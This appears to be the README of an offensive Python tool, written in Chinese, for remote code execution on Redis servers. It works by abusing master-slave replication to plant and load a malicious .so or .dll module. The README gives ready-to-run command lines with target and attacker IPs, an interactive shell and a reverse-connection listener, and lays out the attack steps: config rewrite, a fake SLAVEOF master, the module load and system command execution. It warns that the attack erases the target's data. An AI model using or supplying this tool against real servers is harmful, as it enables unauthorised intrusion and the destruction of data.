
该主从复制命令执行会 清空 目标redis数据！！！！



## ✨ 功能特点

  * **跨平台 Payload 支持**：内置了 Windows (`.dll`) 和 Linux (`.so`) 的 Payload 模板。
  * **交互式 Shell**：支持单条命令执行模式和交互式 Shell 模式。
  * **自动清理**：退出时尝试自动卸载模块并恢复 Redis 原始配置（文件名、目录等）。
  * **纯 Python 实现**：依赖少，易于修改和部署。

## 🛠️ 安装依赖


pip install redis


## 🚀 使用方法


1. 针对 Linux 目标

假设目标 IP 为 `192.168.1.10`，攻击机 IP 为 `192.168.1.5`，监听反连端口 `2222`。

进入交互式 Shell
python redis_rce.py -r 192.168.1.10 -p 6379 -L 192.168.1.5 -P 2222 --so

执行单条命令
python redis_rce.py -r 192.168.1.10 -p 6379 -L 192.168.1.5 -P 2222 --so -c "id"


2. 针对 Windows 目标

python redis_rce.py -r 192.168.1.10 -L 192.168.1.5 -P 2222 --dll -c "whoami"


3. 指定 Redis 密码和自定义路径

如果 Redis 有密码，或者需要将文件写入特定目录（如 `/tmp`）：

python redis_rce.py -r 192.168.1.10 -p 6379 -w "password123" -L 192.168.1.5  -P 2222 --so -rp /tmp


## ⚙️ 参数说明

| 参数 | 简写 | 必填 | 默认值 | 说明 |
| :--- | :--- | :--- | :--- | :--- |
| `--rhost` | `-r` | ✅ | - | 目标 Redis 服务器 IP |
| `--rport` | `-p` | ❌ | 6379 | 目标 Redis 服务器端口 |
| `--password` | `-w` | ❌ | None | 目标 Redis 认证密码 |
| `--lhost` | `-L` | ✅ | - | 本地 IP (用于伪装 Slave 并接收连接) |
| `--lport` | `-P` | ❌ | 6379 | 本地监听端口 (用于传输 Payload) |
| `--dll` | - | ✅\* | - | 指定目标为 Windows (加载 DLL)，与 `--so` 二选一 |
| `--so` | - | ✅\* | - | 指定目标为 Linux (加载 SO)，与 `--dll` 二选一 |
| `--command` | `-c` | ❌ | - | 单次执行的系统命令 |
| `--rpath` | `-rp` | ❌ | `.` | 目标服务器上的写入目录 (建议使用绝对路径) |
| `--rfile` | `-rf` | ❌ | `exp.so/dll` | 目标服务器上的保存文件名 |


## 📝 攻击原理

1.  **连接**：脚本连接到目标 Redis。
2.  **配置**：修改目标的 `dir` 和 `dbfilename` 配置，指向可写目录和恶意文件名。
3.  **伪装**：在本地启动 TCP 服务器，并发送 `SLAVEOF` 命令给目标，让目标将其认作 Master。
4.  **同步**：目标请求同步数据，脚本发送伪造的 RDB 数据流（实际上是恶意 Shared Object 文件）。
5.  **加载**：目标将数据写入磁盘后，脚本发送 `MODULE LOAD` 命令加载该文件。
6.  **执行**：加载成功后，通过自定义命令（默认 `system.exec`）执行系统指令。
7.  **清理**：执行完毕后，卸载模块并恢复原始配置。


## payload参考
里面so和dll payload没有直接去编辑，这里借用的下面老哥的
https://github.com/yuyan-sec/RedisEXP
